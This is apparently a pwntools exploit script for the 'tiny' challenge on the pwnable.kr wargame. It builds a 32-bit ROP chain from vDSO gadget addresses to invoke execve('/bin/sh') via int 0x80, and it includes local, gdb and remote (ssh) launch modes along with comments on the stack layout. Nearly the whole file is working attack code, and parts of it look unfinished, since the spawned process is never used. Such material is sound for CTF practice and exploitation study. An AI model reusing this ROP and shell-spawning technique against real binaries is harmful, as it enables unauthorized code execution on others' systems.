from sys import executable
from pwn import *
from pwnlib.asm import environ
from pwnlib.util.proc import exe;

vDSO_base = 0xf7ffc000;
# context.arch="i386"
# context.kernel="amd64"
# context.os="linux"

binary_name = "tiny"
elf  = ELF(binary_name, checksec=True)
context.binary = elf

# the binary is 32 bit, so we will use int 0x80 and not syscall;
syscall_addr = vDSO_base+  0x00000577;
pop_ebx_esi_edi_ebp = vDSO_base+0x00000dea;
pop_edx_ecx = vDSO_base+0x0000057a;
pop_eax = 0x08048074;
bin_sh_chain_4000=b"/"*(0x1000-len("bin/sh")) +b"bin/sh";
pop_ebp = 0xf7ffcded

bin_sh=b"/bin/sh";

garbage = p32(0xdeadbeef);

ret=p32(0xf7ffc57c)

# split in two for readability;

payload1 = flat(pop_ebx_esi_edi_ebp,bin_sh,garbage,garbage);

payload2 = flat(syscall_addr);

final_payload = payload1+payload2;

print(final_payload)

argv = [p32(pop_ebp),p32(pop_ebx_esi_edi_ebp),bin_sh,garbage,garbage,garbage,p32(pop_edx_ecx),b"",b"",p32(syscall_addr),b""]

# pop ebp to get rid of the address call pushes
# followed by a rop chain to set the stage for execve


argv2=[ret,ret,ret,ret,ret,p32(pop_ebx_esi_edi_ebp),bin_sh,garbage,garbage,p32(pop_edx_ecx)]


env = dict()

env["1"] = "1"
env[""] = "bin/sh"
env["2"] = "2"

def main():
    if(len(sys.argv) <2):
        print("Need to specify target.")
    else:
        if(sys.argv[1] == "remote"):
            s = ssh(user='tiny',host='pwnable.kr',port=2222,password='guest') 
            p= s.process(f"./{binary_name}") 
        elif(sys.argv[1] == "gdb"):
            p = gdb.debug(["./tiny"]+argv,  env=env, aslr=False)
            sleep(10000)
        else:
            p = process(argv=argv, executable='./tiny', env={},aslr=False)

    # for _ in range(100000):
    #     p = process(argv=argv, executable='./tiny', env={},aslr=False)
    #     try:
    #         p.sendline(b'ls')
    #         p.recvline()
    #     except Exception as e:
    #         print('failure...')
    #         p.close()
    #         continue
    #     p.interactive()

# Stack layout(0x0 is defined as the first env_var ):;

# 0x0 : argc  ->  will be popped into eax;
# 0x1: pop_ebx_esi_ebp -> will be popped into edx(it's dereferencing a ptr to a string);
# .....;
# 0x1000 byte long padding (minus two pops) (each env variable here will have /bin/sh);
# 0xFF8: 0x500 (hope to hit one of the /bin/sh strings);
# padding;
# padding;
# 0x1000: pop_edx_ecx;
# 0x1004: 0;
# 0x1008: 0;
# 0x100B: syscall_addr;



main();
